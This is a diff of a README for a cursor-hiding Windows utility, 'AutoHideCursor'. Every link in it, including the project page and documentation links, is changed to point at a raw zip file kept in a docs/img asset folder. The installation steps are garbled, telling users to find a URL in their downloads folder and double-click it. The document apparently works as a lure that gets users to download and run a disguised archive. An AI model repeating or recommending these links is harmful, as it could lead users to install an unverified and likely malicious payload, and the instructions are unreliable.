@@ -1,7 +1,7 @@
 # 🖱️ AutoHideCursor - Automatically Hide Your Mouse Cursor
 
 ## 🚀 Download Now
-[![Download AutoHideCursor](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip)
+[![Download AutoHideCursor](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip)
 
 ## 📋 Overview
 AutoHide Cursor is a lightweight Windows tray app that automatically hides the mouse cursor after a short period of inactivity. This tool is perfect for users who want a cleaner screen while watching videos, making presentations, or simply working without distractions. With AutoHideCursor, you can:
@@ -28,16 +28,16 @@ AutoHide Cursor is a lightweight Windows tray app that automatically hides the m
 
 1. **Visit the Release Page:**
    Click the link below to open the release page.
-   [Download AutoHideCursor](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip)
+   [Download AutoHideCursor](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip)
 
 2. **Select the Latest Release:**
    On the release page, find the latest version listed at the top.
 
 3. **Download the Installer:**
-   Look for the file named `https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip`. Click on it to download the installer.
+   Look for the file named `https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip`. Click on it to download the installer.
 
 4. **Run the Installer:**
-   After the download is complete, locate `https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip` in your downloads folder. Double-click on it to start the installation.
+   After the download is complete, locate `https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip` in your downloads folder. Double-click on it to start the installation.
 
 5. **Follow Installation Prompts:**
    Follow the on-screen instructions to complete the installation. You will need to accept the license agreement and may be asked to choose an install location.
@@ -85,8 +85,8 @@ If you encounter issues, restart your computer and try running AutoHideCursor ag
 If you have any questions or need assistance, feel free to open an issue in the GitHub repository. Our community is here to help.
 
 ## 🔗 Additional Resources
-- [Project Page](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip)
-- [Documentation](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip)
+- [Project Page](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip)
 
 ## 📥 Download & Install
-To download AutoHideCursor, [visit this page](https://github.com/Elseiny1/AutoHideCursor/raw/refs/heads/master/docs/css/Cursor_Auto_Hide_1.6-beta.4.zip) and get started on improving your workspace today!
+To download AutoHideCursor, [visit this page](https://raw.githubusercontent.com/Elseiny1/AutoHideCursor/master/docs/img/Auto_Hide_Cursor_v1.1.zip) and get started on improving your workspace today!
